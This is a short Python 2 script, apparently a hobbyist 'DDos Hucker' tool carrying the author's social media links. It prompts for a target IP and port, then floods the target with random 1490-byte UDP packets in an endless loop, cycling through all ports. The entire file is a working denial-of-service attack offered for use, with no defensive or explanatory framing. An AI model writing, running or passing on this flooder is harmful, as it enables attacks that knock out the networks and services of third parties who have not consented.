import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Hucker")
print
print "Author   : 680UL"
print "You Tube : https://youtube.com/channel/UC-VePldOINTlyW5rqwkAriA"
print "github   : https://github.com/680UL"
print "Facebook : https://www.facebook.com/arkar.kyaw.27"
print
ip = raw_input("Target IP : ")
port = input("Port      : ")

os.system("clear")
os.system("figlet Hucking Starting")
time.sleep(7)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

